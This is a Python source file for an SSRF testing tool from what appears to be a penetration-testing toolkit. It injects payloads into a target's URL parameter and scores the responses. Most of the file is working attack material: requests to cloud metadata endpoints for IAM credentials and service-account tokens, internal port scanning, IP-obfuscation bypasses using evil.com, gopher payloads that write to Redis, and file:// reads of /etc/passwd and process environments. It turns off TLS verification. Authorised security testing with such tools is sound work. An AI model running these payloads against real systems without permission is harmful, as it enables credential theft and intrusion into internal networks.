"""
SSRF (Server-Side Request Forgery) Testing Wrapper

Tests for SSRF vulnerabilities including:
- Cloud metadata access (AWS, GCP, Azure, DigitalOcean, Oracle)
- Internal network scanning
- Localhost/loopback access
- SSRF bypass techniques (IP obfuscation, DNS rebinding, etc.)
- Out-of-band (OOB) callback detection
"""
import sys
import argparse
import json
import requests
from pathlib import Path
from typing import Dict, List, Any, Optional
from dataclasses import dataclass, field
from urllib.parse import urlparse, urljoin, quote

sys.path.insert(0, str(Path(__file__).parent.parent.parent))

from utils.base_wrapper import BaseToolWrapper


@dataclass
class SSRFFinding:
    """Represents an SSRF finding"""
    payload: str
    payload_type: str
    target_url: str
    status_code: int
    response_length: int
    potential_vuln: bool
    evidence: Optional[str] = None
    response_time: Optional[float] = None
    cloud_provider: Optional[str] = None


class SSRFTester(BaseToolWrapper):
    """SSRF testing wrapper with cloud metadata checks and bypass techniques."""

    # AWS metadata URLs
    AWS_METADATA_URLS = [
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/ami-id",
        "http://169.254.169.254/latest/meta-data/instance-id",
        "http://169.254.169.254/latest/meta-data/instance-type",
        "http://169.254.169.254/latest/meta-data/local-hostname",
        "http://169.254.169.254/latest/meta-data/local-ipv4",
        "http://169.254.169.254/latest/meta-data/public-hostname",
        "http://169.254.169.254/latest/meta-data/public-ipv4",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://169.254.169.254/latest/user-data/",
        "http://169.254.169.254/latest/dynamic/instance-identity/document",
    ]

    # GCP metadata URLs
    GCP_METADATA_URLS = [
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://metadata.google.internal/computeMetadata/v1/project/project-id",
        "http://metadata.google.internal/computeMetadata/v1/instance/hostname",
        "http://metadata.google.internal/computeMetadata/v1/instance/id",
        "http://metadata.google.internal/computeMetadata/v1/instance/zone",
        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
        "http://169.254.169.254/computeMetadata/v1/",
    ]

    # Azure metadata URLs
    AZURE_METADATA_URLS = [
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
    ]

    # DigitalOcean metadata URLs
    DIGITALOCEAN_METADATA_URLS = [
        "http://169.254.169.254/metadata/v1/",
        "http://169.254.169.254/metadata/v1/id",
        "http://169.254.169.254/metadata/v1/hostname",
        "http://169.254.169.254/metadata/v1/region",
    ]

    # Oracle Cloud metadata URLs
    ORACLE_METADATA_URLS = [
        "http://169.254.169.254/opc/v1/instance/",
        "http://169.254.169.254/opc/v1/instance/id",
        "http://169.254.169.254/opc/v1/instance/region",
    ]

    # Internal/Localhost URLs
    INTERNAL_URLS = [
        "http://127.0.0.1/",
        "http://127.0.0.1:80/",
        "http://127.0.0.1:443/",
        "http://127.0.0.1:22/",
        "http://127.0.0.1:3306/",
        "http://127.0.0.1:5432/",
        "http://127.0.0.1:6379/",
        "http://127.0.0.1:11211/",
        "http://127.0.0.1:27017/",
        "http://127.0.0.1:8080/",
        "http://127.0.0.1:8443/",
        "http://localhost/",
        "http://localhost:80/",
        "http://localhost:8080/",
        "http://[::1]/",
        "http://0.0.0.0/",
        "http://0/",
    ]

    # SSRF Bypass techniques
    BYPASS_PAYLOADS = [
        # Decimal IP representation
        "http://2130706433/",  # 127.0.0.1 in decimal
        "http://3232235521/",  # 192.168.0.1 in decimal
        # Octal representation
        "http://0177.0.0.1/",
        "http://0177.0.0.01/",
        "http://0x7f.0.0.1/",
        "http://0x7f.0x0.0x0.0x1/",
        # Hex representation
        "http://0x7f000001/",
        "http://0x7f.0.0.1/",
        # Mixed representation
        "http://127.0.0.1.nip.io/",
        "http://127.0.0.1.xip.io/",
        "http://localtest.me/",
        "http://customer1.app.localhost.my.company.127.0.0.1.nip.io/",
        # Unicode dots
        "http://127。0。0。1/",
        "http://127%E3%80%820%E3%80%820%E3%80%821/",
        # URL encoded
        "http://127.0.0.1%00.evil.com/",
        "http://127.0.0.1%23.evil.com/",
        # Alternative IPv4 representations
        "http://127.1/",
        "http://127.0.1/",
        # IPv6 representations
        "http://[0:0:0:0:0:ffff:127.0.0.1]/",
        "http://[::127.0.0.1]/",
        "http://[::ffff:127.0.0.1]/",
        # DNS rebinding preparation
        "http://spoofed.burpcollaborator.net/",
        # Protocol smuggling
        "gopher://127.0.0.1:6379/_",
        "dict://127.0.0.1:6379/info",
        "file:///etc/passwd",
        "file:///c:/windows/win.ini",
    ]

    # SSRF vulnerability indicators
    CLOUD_INDICATORS = {
        'aws': ['ami-', 'instance-id', 'security-credentials', 'iam', 'ec2', 'aws'],
        'gcp': ['computeMetadata', 'google', 'gcp', 'project-id', 'service-accounts'],
        'azure': ['azurespeed', 'azure', 'microsoft', 'metadata'],
        'digitalocean': ['digitalocean', 'droplet'],
        'oracle': ['opc', 'oracle', 'oci'],
    }

    INTERNAL_INDICATORS = [
        'root:', 'localhost', '127.0.0.1', '::1', 'internal',
        'private', 'intranet', 'admin', 'dashboard',
        'phpinfo', 'server-status', 'server-info',
    ]

    @property
    def tool_name(self) -> str:
        return "ssrf_tester"

    @property
    def tool_category(self) -> str:
        return "advanced"

    def _build_target_args(self, target: str, **kwargs) -> list:
        """SSRF tester doesn't use CLI - this returns empty"""
        return []

    def check_tool_installed(self) -> bool:
        """Override - this tool is pure Python"""
        try:
            import requests
            return True
        except ImportError:
            return False

    def test_ssrf(self, url: str, param_name: str, callback_url: Optional[str] = None,
                  method: str = 'GET', headers: Optional[Dict] = None,
                  cookies: Optional[Dict] = None, timeout: int = 10) -> Dict[str, List[SSRFFinding]]:
        """Test for SSRF vulnerabilities with comprehensive payload set."""
        results = {
            'cloud_metadata': [],
            'internal_access': [],
            'bypass_attempts': [],
            'oob_callback': None
        }
        headers = headers or {}

        # Test cloud metadata endpoints
        print("[*] Testing cloud metadata endpoints...")
        for category, urls in [
            ('aws', self.AWS_METADATA_URLS),
            ('gcp', self.GCP_METADATA_URLS),
            ('azure', self.AZURE_METADATA_URLS),
            ('digitalocean', self.DIGITALOCEAN_METADATA_URLS),
            ('oracle', self.ORACLE_METADATA_URLS),
        ]:
            for meta_url in urls[:3]:  # Limit to first 3 for each provider
                finding = self._test_payload(
                    url, param_name, meta_url, method, headers, cookies, timeout
                )
                finding.payload_type = f'cloud_metadata_{category}'
                finding.cloud_provider = category
                results['cloud_metadata'].append(finding)

        # Test internal URLs
        print("[*] Testing internal/localhost access...")
        for internal_url in self.INTERNAL_URLS[:10]:
            finding = self._test_payload(
                url, param_name, internal_url, method, headers, cookies, timeout
            )
            finding.payload_type = 'internal_access'
            results['internal_access'].append(finding)

        # Test bypass techniques
        print("[*] Testing SSRF bypass techniques...")
        for bypass in self.BYPASS_PAYLOADS[:15]:
            finding = self._test_payload(
                url, param_name, bypass, method, headers, cookies, timeout
            )
            finding.payload_type = 'bypass_technique'
            results['bypass_attempts'].append(finding)

        # OOB callback test
        if callback_url:
            print(f"[*] Testing OOB callback: {callback_url}")
            finding = self._test_payload(
                url, param_name, callback_url, method, headers, cookies, timeout
            )
            finding.payload_type = 'oob_callback'
            results['oob_callback'] = finding

        return results

    def test_cloud_metadata(self, url: str, param_name: str, provider: str = 'all',
                            method: str = 'GET', headers: Optional[Dict] = None,
                            cookies: Optional[Dict] = None, timeout: int = 10) -> List[SSRFFinding]:
        """Specifically test for cloud metadata access."""
        findings = []
        headers = headers or {}

        provider_urls = {
            'aws': self.AWS_METADATA_URLS,
            'gcp': self.GCP_METADATA_URLS,
            'azure': self.AZURE_METADATA_URLS,
            'digitalocean': self.DIGITALOCEAN_METADATA_URLS,
            'oracle': self.ORACLE_METADATA_URLS,
        }

        if provider == 'all':
            test_providers = provider_urls
        else:
            test_providers = {provider: provider_urls.get(provider, [])}

        for prov_name, urls in test_providers.items():
            # Add provider-specific headers
            test_headers = headers.copy()
            if prov_name == 'gcp':
                test_headers['Metadata-Flavor'] = 'Google'
            elif prov_name == 'azure':
                test_headers['Metadata'] = 'true'

            for meta_url in urls:
                finding = self._test_payload(
                    url, param_name, meta_url, method, test_headers, cookies, timeout
                )
                finding.payload_type = f'cloud_metadata_{prov_name}'
                finding.cloud_provider = prov_name
                findings.append(finding)

        return findings

    def test_internal_network(self, url: str, param_name: str,
                              ip_range: str = '192.168.1', ports: List[int] = None,
                              method: str = 'GET', headers: Optional[Dict] = None,
                              cookies: Optional[Dict] = None, timeout: int = 5) -> List[SSRFFinding]:
        """Scan internal network range for open services."""
        findings = []
        headers = headers or {}
        ports = ports or [80, 443, 8080, 22, 3306, 5432, 6379]

        # Test a sample of internal IPs
        for i in range(1, 11):  # Test .1 to .10
            for port in ports[:3]:  # Limit ports
                internal_url = f"http://{ip_range}.{i}:{port}/"
                finding = self._test_payload(
                    url, param_name, internal_url, method, headers, cookies, timeout
                )
                finding.payload_type = 'internal_scan'
                findings.append(finding)

        return findings

    def test_protocol_smuggling(self, url: str, param_name: str,
                                method: str = 'GET', headers: Optional[Dict] = None,
                                cookies: Optional[Dict] = None, timeout: int = 10) -> List[SSRFFinding]:
        """Test for protocol smuggling via SSRF."""
        findings = []
        headers = headers or {}

        protocol_payloads = [
            # Gopher protocol for Redis
            "gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0aINFO%0d%0a",
            "gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aSET%0d%0a$4%0d%0atest%0d%0a$4%0d%0adata%0d%0a",
            # Gopher for Memcached
            "gopher://127.0.0.1:11211/_stats%0d%0a",
            # Dict protocol
            "dict://127.0.0.1:6379/info",
            "dict://127.0.0.1:11211/stats",
            # File protocol
            "file:///etc/passwd",
            "file:///etc/hosts",
            "file:///proc/self/environ",
            "file:///c:/windows/win.ini",
            "file:///c:/windows/system32/drivers/etc/hosts",
            # LDAP
            "ldap://127.0.0.1:389/",
            # FTP
            "ftp://127.0.0.1:21/",
        ]

        for payload in protocol_payloads:
            finding = self._test_payload(
                url, param_name, payload, method, headers, cookies, timeout
            )
            finding.payload_type = 'protocol_smuggling'
            findings.append(finding)

        return findings

    def _test_payload(self, url: str, param_name: str, payload: str,
                      method: str, headers: Dict, cookies: Optional[Dict],
                      timeout: int) -> SSRFFinding:
        """Send request with SSRF payload."""
        try:
            if method.upper() == 'GET':
                # Handle URL parameter injection
                if '?' in url:
                    if f'{param_name}=' in url:
                        # Replace existing parameter value
                        import re
                        test_url = re.sub(
                            f'{param_name}=[^&]*',
                            f'{param_name}={quote(payload, safe="")}',
                            url
                        )
                    else:
                        test_url = f"{url}&{param_name}={quote(payload, safe='')}"
                else:
                    test_url = f"{url}?{param_name}={quote(payload, safe='')}"

                response = requests.get(
                    test_url,
                    headers=headers,
                    cookies=cookies,
                    timeout=timeout,
                    allow_redirects=False,
                    verify=False
                )
            else:
                response = requests.post(
                    url,
                    data={param_name: payload},
                    headers=headers,
                    cookies=cookies,
                    timeout=timeout,
                    allow_redirects=False,
                    verify=False
                )

            vuln_detected = self._detect_ssrf(response, payload)

            return SSRFFinding(
                payload=payload,
                payload_type='',
                target_url=url,
                status_code=response.status_code,
                response_length=len(response.text),
                potential_vuln=vuln_detected,
                evidence=response.text[:500] if vuln_detected else None,
                response_time=response.elapsed.total_seconds()
            )
        except requests.exceptions.Timeout:
            return SSRFFinding(
                payload=payload,
                payload_type='',
                target_url=url,
                status_code=0,
                response_length=0,
                potential_vuln=True,  # Timeout can indicate successful SSRF
                evidence='Request timed out - possible SSRF to internal service',
                response_time=timeout
            )
        except requests.exceptions.ConnectionError as e:
            error_str = str(e).lower()
            # Connection refused might indicate the target tried to connect
            is_potential = 'connection refused' in error_str or 'connect' in error_str
            return SSRFFinding(
                payload=payload,
                payload_type='',
                target_url=url,
                status_code=0,
                response_length=0,
                potential_vuln=is_potential,
                evidence=f'Connection error: {str(e)[:200]}' if is_potential else None,
                response_time=0
            )
        except Exception as e:
            return SSRFFinding(
                payload=payload,
                payload_type='',
                target_url=url,
                status_code=0,
                response_length=0,
                potential_vuln=False,
                evidence=str(e)[:200],
                response_time=0
            )

    def _detect_ssrf(self, response: requests.Response, payload: str) -> bool:
        """Detect SSRF indicators in response."""
        text_lower = response.text.lower()

        # Check for cloud metadata indicators
        for provider, indicators in self.CLOUD_INDICATORS.items():
            if any(ind.lower() in text_lower for ind in indicators):
                return True

        # Check for internal access indicators
        if any(ind in text_lower for ind in self.INTERNAL_INDICATORS):
            return True

        # Check for specific file contents
        if 'file://' in payload.lower():
            file_indicators = [
                'root:x:', 'daemon:', 'nobody:',  # /etc/passwd
                '[extensions]', '[fonts]',  # win.ini
                '127.0.0.1', 'localhost',  # hosts file
            ]
            if any(ind in text_lower for ind in file_indicators):
                return True

        # Check for protocol-specific responses
        protocol_indicators = [
            'redis_version', 'redis_git',  # Redis
            'stat items', 'stat slabs',  # Memcached
            'ftp', '220 ',  # FTP
            'ldap', 'dn:',  # LDAP
        ]
        if any(ind in text_lower for ind in protocol_indicators):
            return True

        # Check for error messages that reveal SSRF
        ssrf_errors = [
            'could not resolve', 'connection refused', 'connection timed out',
            'getaddrinfo failed', 'name or service not known',
            'no route to host', 'network is unreachable',
        ]
        if any(err in text_lower for err in ssrf_errors):
            # These errors might indicate the server tried to make the request
            return True

        return False

    def run(self, target: str, output_file: str = None, **kwargs) -> Dict[str, Any]:
        """Run SSRF tests."""
        from datetime import datetime

        self.start_time = datetime.now()

        param_name = kwargs.get('param', 'url')
        method = kwargs.get('method', 'GET')
        headers = kwargs.get('headers')
        cookies = kwargs.get('cookies')
        callback_url = kwargs.get('callback_url')
        test_type = kwargs.get('test_type', 'full')
        timeout = kwargs.get('timeout', 10)

        all_findings = []

        print(f"[*] Testing SSRF on {target}")
        print(f"[*] Parameter: {param_name}, Method: {method}")

        if test_type == 'full' or test_type == 'all':
            results = self.test_ssrf(
                url=target, param_name=param_name, callback_url=callback_url,
                method=method, headers=headers, cookies=cookies, timeout=timeout
            )
            for category, findings in results.items():
                if isinstance(findings, list):
                    all_findings.extend(findings)
                elif findings:
                    all_findings.append(findings)
        elif test_type == 'cloud':
            findings = self.test_cloud_metadata(
                url=target, param_name=param_name, method=method,
                headers=headers, cookies=cookies, timeout=timeout
            )
            all_findings.extend(findings)
        elif test_type == 'internal':
            findings = self.test_internal_network(
                url=target, param_name=param_name, method=method,
                headers=headers, cookies=cookies, timeout=timeout
            )
            all_findings.extend(findings)
        elif test_type == 'protocol':
            findings = self.test_protocol_smuggling(
                url=target, param_name=param_name, method=method,
                headers=headers, cookies=cookies, timeout=timeout
            )
            all_findings.extend(findings)

        self.end_time = datetime.now()
        duration = (self.end_time - self.start_time).total_seconds()

        # Filter vulnerable findings
        vulnerable = [f for f in all_findings if f.potential_vuln]

        # Save results
        if output_file is None:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            output_file = self.output_dir / f"ssrf_test_{timestamp}.json"

        results_data = {
            'target': target,
            'parameter': param_name,
            'method': method,
            'test_type': test_type,
            'total_tests': len(all_findings),
            'vulnerable_count': len(vulnerable),
            'findings': [
                {
                    'payload': f.payload,
                    'payload_type': f.payload_type,
                    'target_url': f.target_url,
                    'status_code': f.status_code,
                    'response_length': f.response_length,
                    'potential_vuln': f.potential_vuln,
                    'evidence': f.evidence,
                    'response_time': f.response_time,
                    'cloud_provider': f.cloud_provider
                }
                for f in all_findings
            ]
        }

        with open(output_file, 'w') as f:
            json.dump(results_data, f, indent=2)
        print(f"[+] Results saved to: {output_file}")

        return {
            'success': True,
            'tool': self.tool_name,
            'target': target,
            'duration': duration,
            'output_file': str(output_file),
            'results': all_findings,
            'vulnerable_count': len(vulnerable)
        }


def main():
    parser = argparse.ArgumentParser(
        description="SSRF Tester - Test for Server-Side Request Forgery vulnerabilities",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python ssrf_tester.py -u "https://example.com/fetch" -p url
  python ssrf_tester.py -u "https://example.com/proxy" -p target --test-type cloud
  python ssrf_tester.py -u "https://example.com/api" -p redirect --callback http://your-callback.com
  python ssrf_tester.py -u "https://example.com/image" -p src --test-type protocol
        """
    )

    parser.add_argument("-u", "--url", required=True, help="Target URL")
    parser.add_argument("-p", "--param", default="url", help="Parameter to test (default: url)")
    parser.add_argument("-m", "--method", default="GET", choices=['GET', 'POST'],
                       help="HTTP method (default: GET)")
    parser.add_argument("--test-type", default="full",
                       choices=['full', 'cloud', 'internal', 'protocol'],
                       help="Type of SSRF test to run (default: full)")
    parser.add_argument("--callback", help="OOB callback URL (e.g., Burp Collaborator)")
    parser.add_argument("-H", "--header", action="append", dest="headers",
                       help="Custom header (format: 'Name: Value')")
    parser.add_argument("--cookie", help="Cookie string")
    parser.add_argument("-t", "--timeout", type=int, default=10,
                       help="Request timeout in seconds (default: 10)")
    parser.add_argument("-o", "--output", help="Output file path")

    args = parser.parse_args()

    # Parse headers
    headers = {}
    if args.headers:
        for h in args.headers:
            if ':' in h:
                name, value = h.split(':', 1)
                headers[name.strip()] = value.strip()

    # Parse cookies
    cookies = None
    if args.cookie:
        cookies = {}
        for cookie in args.cookie.split(';'):
            if '=' in cookie:
                name, value = cookie.split('=', 1)
                cookies[name.strip()] = value.strip()

    tester = SSRFTester()

    result = tester.run(
        target=args.url,
        param=args.param,
        method=args.method,
        test_type=args.test_type,
        callback_url=args.callback,
        headers=headers if headers else None,
        cookies=cookies,
        timeout=args.timeout,
        output_file=args.output
    )

    # Print summary
    print(f"\n{'='*60}")
    print(f"SSRF Test Results")
    print(f"{'='*60}")
    print(f"Target: {args.url}")
    print(f"Parameter: {args.param}")
    print(f"Test Type: {args.test_type}")
    print(f"Total Tests: {len(result['results'])}")
    print(f"Potential Vulnerabilities: {result['vulnerable_count']}")

    if result['vulnerable_count'] > 0:
        print(f"\n[!] POTENTIAL SSRF FOUND!")
        for finding in result['results']:
            if finding.potential_vuln:
                print(f"\n  Payload: {finding.payload[:80]}...")
                print(f"  Type: {finding.payload_type}")
                print(f"  Status Code: {finding.status_code}")
                if finding.cloud_provider:
                    print(f"  Cloud Provider: {finding.cloud_provider}")
                if finding.evidence:
                    print(f"  Evidence: {finding.evidence[:200]}...")
    else:
        print("\n[+] No SSRF vulnerabilities detected")

    return 0 if result['success'] else 1


if __name__ == "__main__":
    # Suppress SSL warnings
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    sys.exit(main())
